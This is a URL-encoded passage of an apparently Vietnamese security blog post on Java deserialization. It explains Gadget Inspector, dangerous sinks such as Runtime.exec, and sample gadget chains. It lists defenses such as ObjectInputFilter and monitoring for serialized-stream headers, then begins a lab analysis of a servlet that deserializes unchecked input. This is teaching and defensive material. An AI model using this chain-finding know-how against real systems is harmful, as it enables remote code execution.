C3%A1%20l%C3%A0%20kh%C3%B3%20kh%C4%83n%2C%20l%C3%BAc%20n%C3%A0y%20ch%C3%BAng%20ta%20s%E1%BA%BD%20d%C3%B9ng%20%C4%91%E1%BA%BFn%20%5B**c%C3%B4ng%20c%E1%BB%A5%20Gadget%20Inspector**%5D(https%3A%2F%2Fgithub.com%2FJackOfMostTrades%2Fgadgetinspector).%20M%E1%BA%B7c%20d%C3%B9%20ch%C3%BAng%20ta%20%C4%91%C3%A3%20c%C3%B3%20**YSoSerial**%20nh%C6%B0ng%20tr%C3%AAn%20th%E1%BB%B1c%20t%E1%BA%BF%20kh%C3%B4ng%20ph%E1%BA%A3i%20l%C3%BAc%20n%C3%A0o%20c%C5%A9ng%20s%E1%BB%AD%20d%E1%BB%A5ng%20c%C3%A1c%20th%C6%B0%20vi%E1%BB%87n%20quen%20thu%E1%BB%99c%20c%C3%B3%20trong%20b%E1%BB%99%20**c%C3%B4ng%20c%E1%BB%A5%20YSoSerial**.%20V%C3%AC%20v%E1%BA%ADy%2C%20vi%E1%BB%87c%20c%E1%BA%A7n%20m%E1%BB%99t%20c%C3%B4ng%20c%E1%BB%A5%20t%E1%BB%B1%20%C4%91%E1%BB%99ng%20**ph%C3%A2n%20t%C3%ADch%20t%C4%A9nh%20bytecode%20Java%20%C4%91%E1%BB%83%20t%C3%ACm%20gadget%20chain**%20nh%E1%BA%B1m%20ph%C3%A1t%20hi%E1%BB%87n%20c%C3%A1c%20chu%E1%BB%97i%20**gadget%20chain**%20ti%E1%BB%81m%20n%C4%83ng%20l%C3%A0%20%C4%91i%E1%BB%81u%20c%E1%BA%A7n%20thi%E1%BA%BFt.%0A%0AM%E1%BB%A5c%20%C4%91%C3%ADch%20c%E1%BB%A7a%20c%C3%B4ng%20c%E1%BB%A5%20n%C3%A0y%20l%C3%A0%3A%0A-%20**T%E1%BB%B1%20%C4%91%E1%BB%99ng%20kh%C3%A1m%20ph%C3%A1%20gadget%20chain%20m%E1%BB%9Bi**%20trong%20%E1%BB%A9ng%20d%E1%BB%A5ng%20ho%E1%BA%B7c%20th%C6%B0%20vi%E1%BB%87n%20custom%20m%C3%A0%20kh%C3%B4ng%20c%C3%B3%20trong%20YSoSerial.%0A-%20**T%E1%BB%B1%20%C4%91%E1%BB%99ng%20ph%C3%A2n%20t%C3%ADch%20classpath**%20(c%C3%A1c%20file%20.jar%2C%20.war)%20m%C3%A0%20kh%C3%B4ng%20c%E1%BA%A7n%20code%20ngu%E1%BB%93n.%0A-%20**Ph%C3%A1t%20hi%E1%BB%87n%20source%20v%C3%A0%20sink**%20trong%20qu%C3%A1%20tr%C3%ACnh%20deserialize.%0A-%20**T%E1%BA%A1o%20b%C3%A1o%20c%C3%A1o%20chain%3A**%20k%E1%BA%BFt%20n%E1%BB%91i%20t%E1%BB%AB%20**source**%20(%C4%91i%E1%BB%83m%20entry%20nh%C6%B0%20%60%60%60readObject())%60%60%60%20%C4%91%E1%BA%BFn%20**sink**%20(method%20nguy%20hi%E1%BB%83m%20nh%C6%B0%20%60%60%60Runtime.exec()%60%60%60)%0A-%20**R%C3%BAt%20ng%E1%BA%AFn%20th%E1%BB%9Di%20gian%20pentest**%2C%20gi%C3%BAp%20t%E1%BA%ADp%20trung%20v%C3%A0o%20chain%20c%C3%B3%20kh%E1%BA%A3%20n%C4%83ng%20khai%20th%C3%A1c%20cao.%0A%0AGi%E1%BB%9D%20m%C3%ACnh%20s%E1%BA%BD%20%C4%91i%20s%C3%A2u%20m%E1%BB%99t%20ch%C3%BAt%20v%E1%BB%81%20ch%E1%BB%A9c%20n%C4%83ng%20c%E1%BB%A7a%20c%C3%B4ng%20c%E1%BB%A5%20n%C3%A0y%20cho%20m%E1%BB%8Di%20ng%C6%B0%E1%BB%9Di%20hi%E1%BB%83u%3A%0A**1.%20Ph%C3%A2n%20t%C3%ADch%20t%C4%A9nh%20bytecode%20(Static%20Analysis)**%0A-%20**C%C3%B4ng%20c%E1%BB%A5%20Gadget%20Inspector**%20kh%C3%B4ng%20c%E1%BA%A7n%20m%C3%A3%20ngu%E1%BB%93n%20m%C3%A0%20c%C3%B3%20th%E1%BB%83%20l%C3%A0m%20vi%E1%BB%87c%20tr%E1%BB%B1c%20ti%E1%BA%BFp%20tr%C3%AAn%20**class%20file**%20ho%E1%BA%B7c%20**JAR%2FWAR%2FEAR**.%0A-%20C%C3%B4ng%20c%E1%BB%A5%20%C4%91%E1%BB%8Dc%20bytecode%2C%20sau%20%C4%91%C3%B3%20x%C3%A2y%20d%E1%BB%B1ng%20m%E1%BB%99t**%20call%20graph**%20(%C4%91%E1%BB%93%20th%E1%BB%8B%20g%E1%BB%8Di%20ph%C6%B0%C6%A1ng%20th%E1%BB%A9c)%20%C4%91%E1%BB%83%20hi%E1%BB%83u%20lu%E1%BB%93ng%20th%E1%BB%B1c%20thi%20c%E1%BB%A7a%20ch%C6%B0%C6%A1ng%20tr%C3%ACnh.%0A%0A**2.%20Ph%C3%A1t%20hi%E1%BB%87n%20Source**%0A-%20Gadget%20Inspector%20t%E1%BB%B1%20%C4%91%E1%BB%99ng%20t%C3%ACm%20c%C3%A1c%20**entry%20points**%20(n%C6%A1i%20d%E1%BB%AF%20li%E1%BB%87u%20%C4%91%C6%B0%E1%BB%A3c%20nh%E1%BA%ADp%20v%C3%A0o%20trong%20qu%C3%A1%20tr%C3%ACnh%20deserialize).%0A-%20V%C3%AD%20d%E1%BB%A5%20nh%C6%B0%20c%C3%A1c%20**Java%20magic%20methods**%20nh%C6%B0%20%60%60%60readObject(ObjectInputStream%20in)%60%60%60%2C%20%60%60%60readResolve()%60%60%60%2C%20%60%60%60equals()%60%60%60%2C%20%60%60%60hashCode()%60%60%60%2C%60%60%60%20toString()%60%60%60%2C%20%C4%91%C3%A2y%20l%C3%A0%20nh%E1%BB%AFng%20n%C6%A1i%20payload%20c%E1%BB%A7a%20m%C3%ACnh%20c%C3%B3%20th%E1%BB%83%20%C4%91i%20v%C3%A0o.%0A%0A**3.%20Ph%C3%A1t%20hi%E1%BB%87n%20Sink**%0A-%20C%C3%B4ng%20c%E1%BB%A5%20d%C3%B2%20t%C3%ACm%20nh%E1%BB%AFng%20**API%20nguy%20hi%E1%BB%83m**%20m%C3%A0%20ch%C3%BAng%20ta%20c%C3%B3%20th%E1%BB%83%20l%E1%BB%A3i%20d%E1%BB%A5ng%20(th%C6%B0%E1%BB%9Dng%20l%C3%A0%20RCE).%0A-%20M%E1%BB%99t%20s%E1%BB%91%20sink%20ph%E1%BB%95%20bi%E1%BA%BFn%20nh%C6%B0%20l%C3%A0%3A%60%60%60Runtime.getRuntime().exec(...)%2C%20ProcessBuilder.start()%2C%20Method.invoke(...)%60%60%60%20(Java%20Reflection)%2C%60%60%60Class.forName(...).newInstance()%60%60%60.%0A%0A**4.%20T%C3%ACm%20%C4%91%C6%B0%E1%BB%9Dng%20d%E1%BA%ABn%20Source%20%E2%86%92%20Sink**%0A-%20Ch%E1%BB%A9c%20n%C4%83ng%20quan%20tr%E1%BB%8Dng%20nh%E1%BA%A5t%3A%20**Gadget%20Inspector**%20s%E1%BA%BD%20t%E1%BB%B1%20%C4%91%E1%BB%99ng%20n%E1%BB%91i%20c%C3%A1c%20method%20l%E1%BA%A1i%20%C4%91%E1%BB%83%20t%C3%ACm%20ra%20**gadget%20chain**.(nh%C6%B0ng%20sau%20%C4%91%E1%BA%A5y%20ch%C3%BAng%20ta%20v%E1%BA%ABn%20c%E1%BA%A7n%20ki%E1%BB%83m%20tra%20th%E1%BB%A7%20c%C3%B4ng%20l%E1%BA%A1i)%0A-%20V%C3%AD%20d%E1%BB%A5%20output%20c%C3%B3%20th%E1%BB%83%20ch%E1%BB%89%20ra%20chu%E1%BB%97i%20nh%C6%B0%3A%0A%60%60%60java%0AreadObject%20%E2%86%92%20HashMap.put%20%E2%86%92%20Transformer.transform%20%E2%86%92%20Method.invoke%20%E2%86%92%20Runtime.exec%0A%60%60%60%0A-%20L%C3%BAc%20n%C3%A0y%20ch%C3%BAng%20ta%20%C4%91%C3%A3%20c%C3%B3%20th%E1%BB%83%20x%C3%A1c%20%C4%91%E1%BB%8Bnh%20c%E1%BA%A7n%20**inject%20payload**%20v%C3%A0o%20%C4%91%C3%A2u%20%C4%91%E1%BB%83%20chain%20%C4%91%C6%B0%E1%BB%A3c%20k%C3%ADch%20ho%E1%BA%A1t.%0A%0A**5.%20X%C3%A1c%20%C4%91%E1%BB%8Bnh%20Reflection%20Usage**%0A-%20**Gadget%20Inspector**%20r%E1%BA%A5t%20%C4%91%E1%BA%B7t%20bi%E1%BB%87t%20h%E1%BB%AFu%20%C3%ADch%20gi%C3%BAp%20ch%C3%BAng%20ta%20d%E1%BB%85%20d%C3%A0ng%20ph%C3%A1t%20hi%E1%BB%87n%20c%C3%A1c%20%C4%91o%E1%BA%A1n%20code%20d%C3%B9ng%20**Reflection**%2C%20n%C3%B3%20s%E1%BA%BD%20t%E1%BA%A1o%20b%C6%B0%E1%BB%9Bc%20ngo%E1%BA%B7c%20kh%C3%A1c%20gi%C3%BAp%20ch%C3%BAng%20ta%20g%E1%BB%8Di%20gi%C3%A1n%20ti%E1%BA%BFp%20%C4%91%E1%BA%BFn%20c%C3%A1c%20l%E1%BB%87nh%20v%C3%AD%20d%E1%BB%A5%20nh%C6%B0%20l%C3%A0%20exec.%0A-%20**Gadget%20Inspector**%20s%E1%BA%BD%20highlight%20(t%C3%B4%20s%C3%A1ng)%20nh%E1%BB%AFng%20%C4%91o%E1%BA%A1n%20code%20c%C3%B3%20**Reflection**%20gi%C3%BAp%20ch%C3%BAng%20ta%20s%E1%BA%BD%20%C4%91%E1%BB%A1%20t%E1%BB%91n%20th%E1%BB%9Di%20gian%20%C4%91%E1%BB%8Dc%20bytecode%20th%E1%BB%A7%20c%C3%B4ng%20%C4%91%E1%BB%83%20t%C3%ACm%20%60%60%60Method.invoke%60%60%60%2C%20m%C3%A0%20ch%C3%BAng%20ta%20ch%E1%BB%89%20c%E1%BA%A7n%20qu%C3%A9t%20v%C3%A0%20t%C3%ACm%20%C4%91%C6%B0%E1%BB%A3c%20%20ch%C3%ADnh%20x%C3%A1c%20file%2C%20class%2C%20method%20ch%E1%BB%A9a%20**Reflection**.%0A%0A**6.%20H%E1%BB%97%20tr%E1%BB%A3%20ki%E1%BB%83m%20tra%20Custom%20Gadget%20Chains**%0A-%20Nh%C6%B0%20n%C3%A3y%20m%C3%ACnh%20%C4%91%C3%A3%20n%C3%B3i%2C%20thay%20v%C3%AC%20ch%C3%BAng%20ta%20khi%20d%C3%B9ng%20**YSoSerial**%20ch%E1%BB%89%20c%C3%B3%20m%E1%BB%99t%20t%E1%BA%ADp%20payload%20c%E1%BB%91%20%C4%91%E1%BB%8Bnh%20(ho%E1%BA%B7c%20%C4%91%E1%BB%A3i%20ng%C6%B0%E1%BB%9Di%20kh%C3%A1c%20b%E1%BB%95%20sung)%2C%20th%C3%AC%20**Gadget%20Inspector**%20t%C3%ACm%20ra%20%C4%91%C6%B0%E1%BB%A3c%20%20c%C3%A1c%20**gatget%20chain**%20m%E1%BB%9Bi%20kh%C3%B4ng%20n%E1%BA%B1m%20trong%20**YSoSerial**%2C%20ch%C3%BAng%20ta%20c%C3%B3%20th%E1%BB%83%20d%E1%BB%85%20d%C3%A0ng%20d%E1%BB%B1ng%20custom%20payload%20%C4%91%E1%BB%83%20kh%C3%B3%20ph%C3%A1t%20hi%E1%BB%87n%20h%C6%A1n%2C%20th%E1%BA%ADm%20ch%C3%AD%20l%C3%A0%20c%C3%B3%20th%E1%BB%83%20t%C3%ACm%20ra%20zero-day.%0A%0A**7.%20Xu%E1%BA%A5t%20B%C3%A1o%20C%C3%A1o%20Gadget%20Chains**%0A-%20%C4%90%C3%A2y%20c%C3%B3%20th%E1%BB%83%20coi%20m%E1%BB%99t%20trong%20nh%E1%BB%AFng%20t%C3%ADnh%20n%C4%83ng%20gi%C3%BAp%20ch%C3%BAng%20ta%20d%E1%BB%85%20d%C3%A0ng%20hi%E1%BB%83u%20r%C3%B5%20v%C3%A0%20t%C3%ACm%20ki%E1%BA%BFm%20c%C3%A1c%20**gadget%20chain**%2C%20v%C3%A0%20d%E1%BB%85%20d%C3%A0ng%20d%E1%BB%B1ng%20l%E1%BA%A1i%20PoC.%0A-%20**Gadget%20Inspector**%20s%E1%BA%BD%20xu%E1%BA%A5t%20m%E1%BB%99t%20b%E1%BA%A3n%20**b%C3%A1o%20c%C3%A1o%20chi%20ti%E1%BA%BFt**%2C%20th%C6%B0%E1%BB%9Dng%20d%C6%B0%E1%BB%9Bi%20d%E1%BA%A1ng%20file%20text%20ho%E1%BA%B7c%20JSON%20ch%E1%BB%A9a%3A%20**danh%20s%C3%A1ch%20source**%2C%20**danh%20s%C3%A1ch%20sink**%2C%20**%C4%91%C6%B0%E1%BB%9Dng%20d%E1%BA%ABn%20chain**(call%20graph).%20v%C3%AD%20d%E1%BB%A5%3A%0A%60%60%60yaml%0ASource%3A%20java.util.HashMap.readObject(ObjectInputStream)%0A%7C%0Av%0Aorg.apache.commons.collections.functors.InvokerTransformer.transform(Object)%0A%7C%0Av%0Ajava.lang.reflect.Method.invoke(Object%2C%20Object%5B%5D)%0A%7C%0Av%0Ajava.lang.Runtime.exec(String)%0ASink%3A%20Runtime.exec%0A%0A%60%60%60%0A%0ATham%20kh%E1%BA%A3o%3A%20%5Bsynacktiv%5D(https%3A%2F%2Fwww.synacktiv.com%2Fsites%2Fdefault%2Ffiles%2F2022-07%2FPTS2022-Talk-20-Finding-Java-deserialization-gadgets-with-CodeQL.pdf)%2C%20%5BSheon%0A%5D(https%3A%2F%2Fsheon.hashnode.dev%2Fjava-security-3-cong-cu-gadget-inspector%3Fsource%3Dmore_series_bottom_blogs)%2C%20%5BSlide%20c%E1%BB%A7a%20b%C3%A0i%20tr%C3%ACnh%20b%C3%A0y%20Automated%20Discovery%20of%20Deserialization%20Gadget%20Chains%5D(https%3A%2F%2Fi.blackhat.com%2Fus-18%2FThu-August-9%2Fus-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)%2C%5B%0ATri%20Luu%5D(https%3A%2F%2Fviblo.asia%2Fp%2Fgadget-inspector-101-7ymJXnnRVkq)%0A%0A%23%23%23%2011.%20C%C3%A1ch%20ng%C4%83n%20ch%E1%BA%B7n%20Java%20Deserialization%20vulnerability%0A**Deserialization**%20trong%20Java%20l%C3%A0%20m%E1%BB%99t%20t%C3%ADnh%20n%C4%83ng%20m%E1%BA%A1nh%20m%E1%BA%BD%2C%20nh%C6%B0ng%20n%E1%BA%BFu%20s%E1%BB%AD%20d%E1%BB%A5ng%20sai%20c%C3%A1ch%2C%20n%C3%B3%20c%C3%B3%20th%E1%BB%83%20m%E1%BB%9F%20c%E1%BB%ADa%20cho%20k%E1%BA%BB%20t%E1%BA%A5n%20c%C3%B4ng%20th%E1%BB%B1c%20thi%20m%C3%A3%20t%C3%B9y%20%C3%BD%20ho%E1%BA%B7c%20thao%20t%C3%BAng%20logic%20%E1%BB%A9ng%20d%E1%BB%A5ng.%20%C4%90%E1%BB%83%20gi%E1%BA%A3m%20thi%E1%BB%83u%20r%E1%BB%A7i%20ro%2C%20c%E1%BA%A7n%20%C3%A1p%20d%E1%BB%A5ng%20nhi%E1%BB%81u%20l%E1%BB%9Bp%20ph%C3%B2ng%20th%E1%BB%A7%20thay%20v%C3%AC%20ch%E1%BB%89%20m%E1%BB%99t%20bi%E1%BB%87n%20ph%C3%A1p%20%C4%91%C6%A1n%20l%E1%BA%BB.%0A**1.%20Lo%E1%BA%A1i%20b%E1%BB%8F%20ho%E1%BA%B7c%20H%E1%BA%A1n%20ch%E1%BA%BF%20Java%20Native%20Serialization**%0AC%C3%A1ch%20ph%C3%B2ng%20ng%E1%BB%ABa%20hi%E1%BB%87u%20qu%E1%BA%A3%20nh%E1%BA%A5t%20l%C3%A0%20**kh%C3%B4ng%20s%E1%BB%AD%20d%E1%BB%A5ng%20native%20serialization**%20(ObjectInputStream)%20cho%20d%E1%BB%AF%20li%E1%BB%87u%20nh%E1%BA%ADn%20t%E1%BB%AB%20ng%C6%B0%E1%BB%9Di%20d%C3%B9ng.%0A-%20Thay%20th%E1%BA%BF%20b%E1%BA%B1ng%20%C4%91%E1%BB%8Bnh%20d%E1%BA%A1ng%20an%20to%C3%A0n%20h%C6%A1n%20nh%C6%B0%20**JSON%20(Jackson%2C%20Gson)%2C%20XML%20(JAXB)**.%0A-%20C%C3%A1c%20%C4%91%E1%BB%8Bnh%20d%E1%BA%A1ng%20n%C3%A0y%20kh%C3%B4ng%20cho%20ph%C3%A9p%20ti%C3%AAm%20class%20t%C3%B9y%20%C3%BD%20%E2%86%92%20gi%E1%BA%A3m%20thi%E1%BB%83u%20r%E1%BB%A7i%20ro%20**gadget%20chain**.%0A%0ATham%20kh%E1%BA%A3o%3A%20%5Bportswigger%5D(https%3A%2F%2Fportswigger.net%2Fweb-security%2Fdeserialization%23how-to-prevent-insecure-deserialization-vulnerabilities).%0A%0A**2.%20S%E1%BB%AD%20d%E1%BB%A5ng%20Serialization%20Filtering%20(Java%20%E2%89%A5%209)**%0AJava%209%20gi%E1%BB%9Bi%20thi%E1%BB%87u%20ObjectInputFilter%20cho%20ph%C3%A9p%20ki%E1%BB%83m%20so%C3%A1t%20class%20n%C3%A0o%20%C4%91%C6%B0%E1%BB%A3c%20ph%C3%A9p%20deserialize.%20V%C3%AD%20d%E1%BB%A5%3A%0A%60%60%60java%0AObjectInputFilter%20filter%20%3D%20ObjectInputFilter.Config.createFilter(%22com.myapp.*%3B!*%22)%3B%0AObjectInputStream%20ois%20%3D%20new%20ObjectInputStream(in)%3B%0Aois.setObjectInputFilter(filter)%3B%0A%60%60%60%0A%E1%BB%9E%20%C4%91%C3%A2y%2C%20ch%E1%BB%89%20c%C3%A1c%20class%20trong%20%60%60%60com.myapp%60%60%60%20%C4%91%C6%B0%E1%BB%A3c%20ph%C3%A9p%20deserialize%2C%20c%C3%A1c%20class%20kh%C3%A1c%20b%E1%BB%8B%20t%E1%BB%AB%20ch%E1%BB%91i.%0A**T%C3%A1c%20d%E1%BB%A5ng%3A**%20Lo%E1%BA%A1i%20b%E1%BB%8F%20kh%E1%BA%A3%20n%C4%83ng%20b%E1%BB%8B%20inject%20payload%20t%E1%BB%AB%20th%C6%B0%20vi%E1%BB%87n%20b%C3%AAn%20ngo%C3%A0i.%0A%0ATham%20kh%E1%BA%A3o%3A%20%5BOracle%20Documentation%20on%20ObjectInputFilter%5D(https%3A%2F%2Fdocs.oracle.com%2Fjavase%2F9%2Fdocs%2Fapi%2Fjava%2Fio%2FObjectInputFilter.html)%0A%0A**3.%20Whitelist%20Class%20M%E1%BB%99t%20C%C3%A1ch%20R%C3%B5%20R%C3%A0ng**%0AN%E1%BA%BFu%20b%E1%BA%AFt%20bu%E1%BB%99c%20ph%E1%BA%A3i%20s%E1%BB%AD%20d%E1%BB%A5ng%20**native%20serialization**%3A%0A-%20%C3%81p%20d%E1%BB%A5ng%20**whitelist**%20%C4%91%E1%BB%83%20ch%E1%BB%89%20cho%20ph%C3%A9p%20m%E1%BB%99t%20t%E1%BA%ADp%20class%20c%E1%BB%A5%20th%E1%BB%83.%0A-%20Kh%C3%B4ng%20bao%20gi%E1%BB%9D%20deserialize%20d%E1%BB%AF%20li%E1%BB%87u%20t%E1%BB%AB%20client%20m%C3%A0%20kh%C3%B4ng%20c%C3%B3%20x%C3%A1c%20th%E1%BB%B1c%20ngu%E1%BB%93n%20g%E1%BB%91c.%0A%0A**4.%20Gi%E1%BB%9Bi%20h%E1%BA%A1n%20Quy%E1%BB%81n%20c%E1%BB%A7a%20JVM**%0AD%C3%B9%20payload%20c%C3%B3%20%C4%91%C6%B0%E1%BB%A3c%20ti%C3%AAm%2C%20h%E1%BA%A1n%20ch%E1%BA%BF%20quy%E1%BB%81n%20c%E1%BB%A7a%20JVM%20c%C3%B3%20th%E1%BB%83%20gi%E1%BA%A3m%20m%E1%BB%A9c%20%C4%91%E1%BB%99%20thi%E1%BB%87t%20h%E1%BA%A1i.%20V%C3%AD%20d%E1%BB%A5%20nh%C6%B0%3A%0A-%20Ch%E1%BA%A1y%20%E1%BB%A9ng%20d%E1%BB%A5ng%20trong%20**container**%20ho%E1%BA%B7c%20**sandbox**.%0A-%20S%E1%BB%AD%20d%E1%BB%A5ng%20**Security%20Manager**%20(Java%20%E2%89%A417)%20ho%E1%BA%B7c%20c%C6%A1%20ch%E1%BA%BF%20ki%E1%BB%83m%20so%C3%A1t%20quy%E1%BB%81n%20t%C6%B0%C6%A1ng%20%C4%91%C6%B0%C6%A1ng.%0A-%20V%C3%B4%20hi%E1%BB%87u%20h%C3%B3a%20kh%E1%BA%A3%20n%C4%83ng%20g%E1%BB%8Di%20%60%60%60Runtime.exec%60%60%60%20n%E1%BA%BFu%20kh%C3%B4ng%20c%E1%BA%A7n%20thi%E1%BA%BFt.%0A%0ATham%20kh%E1%BA%A3o%3A%5BOWASP%20-%20Insecure%20Deserialization%5D(https%3A%2F%2Fowasp.org%2Fwww-community%2Fvulnerabilities%2FDeserialization_of_untrusted_data)%0A%0A**5.%20C%E1%BA%ADp%20nh%E1%BA%ADt%20Th%C6%B0%20vi%E1%BB%87n%20B%C3%AAn%20Th%E1%BB%A9%20Ba**%0AR%E1%BA%A5t%20nhi%E1%BB%81u%20gadget%20chain%20khai%20th%C3%A1c%20t%E1%BB%AB%20th%C6%B0%20vi%E1%BB%87n%20ph%E1%BB%95%20bi%E1%BA%BFn%20nh%C6%B0%20**Commons-Collections%2C%20Groovy%2C%20Spring**%20n%C3%AAn%3A%0A-%20Lu%C3%B4n%20c%E1%BA%ADp%20nh%E1%BA%ADt%20dependency%20l%C3%AAn%20phi%C3%AAn%20b%E1%BA%A3n%20m%E1%BB%9Bi%20nh%E1%BA%A5t.%0A-%20S%E1%BB%AD%20d%E1%BB%A5ng%20c%C3%B4ng%20c%E1%BB%A5%20qu%C3%A9t%20dependency%3A%5BOWASP%20Dependency-Check%5D(https%3A%2F%2Fowasp.org%2Fwww-project-dependency-check%2F)%2C%20%5BSnyk%5D(https%3A%2F%2Fsnyk.io%2F)%0A%0A**6.%20Ki%E1%BB%83m%20tra%20v%C3%A0%20Pentest%20%C4%90%E1%BB%8Bnh%20K%E1%BB%B3**%0AKi%E1%BB%83m%20tra%20v%C3%A8%20pentest%20h%E1%BB%87%20th%E1%BB%91ng%20%C4%91%E1%BB%8Bnh%20k%C3%AC%2C%20k%E1%BA%BFt%20h%E1%BB%A3p%20d%C3%B9ng%20m%E1%BB%99t%20s%E1%BB%91%20tool%20nh%C6%B0%20m%C3%ACnh%20%C4%91%C3%A3%20ch%E1%BB%89%20%C4%91%E1%BB%83%20qu%C3%A9t%20source%20code%20v%C3%A0%20t%C3%ACm%20c%C3%A1c%20**gadget%20chain%20ti%E1%BB%81m%20n%C4%83ng**.%0A%0A**7.%20Gi%C3%A1m%20s%C3%A1t%20v%C3%A0%20Logging**%0ATri%E1%BB%83n%20khai%20gi%C3%A1m%20s%C3%A1t%20traffic%20v%C3%A0%20log%20nh%E1%BA%B1m%20ph%C3%A1t%20hi%E1%BB%87n%20payload%20nguy%20hi%E1%BB%83m%3A%0A-%20N%E1%BA%BFu%20th%E1%BA%A5y%20request%20ch%E1%BB%A9a%20chu%E1%BB%97i%20b%E1%BA%AFt%20%C4%91%E1%BA%A7u%20b%E1%BA%B1ng%20%60%60%60AC%20ED%2000%2005%60%60%60%20(STREAM_MAGIC)%20%E2%86%92%20nghi%20ng%E1%BB%9D%20d%E1%BB%AF%20li%E1%BB%87u%20serialize.%0A-%20S%E1%BB%AD%20d%E1%BB%A5ng%20IDS%2FWAF%20%C4%91%E1%BB%83%20ch%E1%BA%B7n%20m%E1%BA%ABu%20payload%20%C4%91%C3%A3%20bi%E1%BA%BFt.%0A-%20Log%20chi%20ti%E1%BA%BFt%20qu%C3%A1%20tr%C3%ACnh%20deserialize%20%C4%91%E1%BB%83%20h%E1%BB%97%20tr%E1%BB%A3%20forensic%20khi%20c%C3%B3%20s%E1%BB%B1%20c%E1%BB%91.%0A%0A---%0A%23%23%20II.%20D%E1%BB%B0NG%20M%C3%94I%20TR%C6%AF%E1%BB%9CNG%20TEST%0ASau%20khi%20xem%20qua%20ph%E1%BA%A7n%20l%C3%AD%20thuy%E1%BA%BFt%20xong%2C%20ch%C3%BAng%20ta%20b%E1%BA%AFt%20%C4%91%E1%BA%A7u%20th%E1%BB%B1c%20h%C3%A0nh%2C%20m%C3%ACnh%20%C4%91%C3%A3%20d%E1%BB%B1ng%20l%E1%BA%A1i%20lab%20%E1%BB%9F%20%5B%C4%91%C3%A2y%5D(https%3A%2F%2Fgithub.com%2FASEN-K5%2FJava-Deserialization-vulnerability-research%2Fblob%2Fmain%2FPoC.rar)%2C%20b%E1%BA%A1n%20ch%E1%BB%89%20c%E1%BA%A7n%20t%E1%BA%A3i%20v%E1%BB%81%20v%C3%A0%20ch%E1%BA%A1y%20docker%20l%C3%A0%20%C4%91%C6%B0%E1%BB%A3c%2C%20web%20s%E1%BA%BD%20n%E1%BA%B1m%20%E1%BB%9F%20port%2013337.%20Sau%20khi%20c%C3%A0i%20xong%2C%20ch%C3%BAng%20ta%20h%C3%A3y%20m%E1%BB%9F%20web%2C%20Burpsuite%20v%C3%A0%20IntelliJ%20IDEA%20(%C4%91%C3%A2y%20l%C3%A0%20IDE%20m%C3%ACnh%20th%E1%BA%A5y%20kh%C3%A1%20thu%E1%BA%ADn%20ti%E1%BB%87n%20%C4%91%E1%BB%83%20debug%2C%20kh%C3%A1%20d%E1%BB%85%20s%C3%A0i%20v%C3%A0%20mi%E1%BB%85n%20ph%C3%AD%20cho%20sinh%20vi%C3%AAn).%20%C4%90%E1%BA%A7u%20ti%C3%AAn%20ch%C3%BAng%20ta%20s%E1%BA%BD%20m%E1%BB%9F%20trang%20web%20l%C3%AAn%20v%C3%A0%20%C4%91%E1%BB%8Dc%20source%20code.%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHJN4ZMAPle.png)%0A%C4%91%C3%A2y%20l%C3%A0%20giao%20di%E1%BB%87n%20c%E1%BB%A7a%20trang%20web%2C%20ta%20s%E1%BA%BD%20xem%20th%E1%BB%AD%20c%C3%A1c%20ch%E1%BB%A9c%20n%C4%83ng%20r%E1%BB%93i%20xem%20source%20code%20c%E1%BB%A7a%20trang%20web.%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FS11cZM0Dlg.png)%0ATi%E1%BA%BFp%20%C4%91%E1%BA%BFn%20ch%C3%BAng%20ta%20xem%20%C4%91%E1%BA%BFn%20source%20v%C3%A0%20ph%C3%A2n%20t%C3%ADch.%0A%0ATrong%20VulnServlet.java%20ta%20th%E1%BA%A5y%20%C4%91o%E1%BA%A1n%20code%20quan%20tr%E1%BB%8Dng%3A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrkCq7fAveg.png)%0A%E1%BB%9E%20%C4%91%C3%A2y%20ta%20th%E1%BA%A5y%20%60%60%60request.getInputStream()%60%60%60%20l%E1%BA%A5y%20d%E1%BB%AF%20li%E1%BB%87u%20t%E1%BB%AB%20method%20POST%2C%20%C4%91%C3%B3%20l%C3%A0%20l%C3%AD%20do%20khi%20m%C3%ACnh%20d%C3%B9ng%20Browser%20m%C3%ACnh%20l%E1%BA%A1i%20th%E1%BA%A5y%20405%20status.%20K%E1%BA%BF%20ti%E1%BA%BFp%20ta%20th%E1%BA%A5y%20h%C3%A0m%20%60%60%60ois.readObject()%60%60%60%20%C4%91%C6%B0%E1%BB%A3c%20g%E1%BB%8Di%20%E1%BB%9F%20d%C6%B0%E1%BB%9Bi%20%C4%91%E1%BB%83%20**deserialize**%20bi%E1%BA%BFn%20%60%60%60Object%20obj%60%60%60%20m%C3%A0%20kh%C3%B4ng%20ki%E1%BB%83m%20tra%20%C4%91%E1%BA%A7u%20v%C3%A0o.%20Sau%20khi%20truy%E1%BB%81n%20v%C3%A0o%20d%E1%BB%AF%20li%E1%BB%87u%2C%20server%20s%E1%BA%BD%20in%20k%E1%BA%BFt%20qu%E1%BA%A3%20l%C3%A0%20**Deserialization%20success**%20%2B%60%60%60obj.getClass().getName()%60%60%60%2C%20m%C3%B4%20ph%E1%BB%8Fng%20cho%20m%E1%BB%8Di%20ng%C6%B0%E1%BB%9Di%20d%E1%BB%85%20th%E1%BA%A5y%20%C4%91%C6%B0%E1%BB%A3c%20c%C3%A1c%20object%20n%C3%A0o%20%C4%91%C6%B0%E1%BB%A3c%20deserialize%20th%C3%A0nh%20c%C3%B4ng.%0ASau%20%C4%91%E1%BA%A5y%20ta%20d%E1%BB%85%20d%C3%A0ng%20ph%C3%A1t%20hi%E1%BB%87n%20%C4%91%C6%B0%E1%BB%A3c%20sink%20l%C3%A0%20n%E1%BA%B1m%20%E1%BB%9F%20trong%20class%20DangerousAction%20v%E1%BB%9Bi%20field%20%60%60%60readObject%60%60%60.%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHy7kDG0vee.png)%0A%C4%90%C3%A2y%20l%C3%A0%20ch%E1%BB%97%20ch%C3%BAng%20ta%20th%E1%BA%A5y%20c%C3%B3%20kh%E1%BA%A3%20n%C4%83ng%20RCE%2C%20v%C3%AC%20v%E1%BA%ADy%20ta%20s%E1%BA%BD%20ki%E1%BA%BFm%20c%C3%A1ch%20%C4%91%E1%BB%83%20g%E1%BB%8Di.%20T%E1%BB%AB%20%C4%91%C3%A2y%20ta%20c%C3%B3%20th%E1%BB%83%20n%E1%BB%91i%20l%E1%BA%A1i%20th%C3%A0nh%20m%E1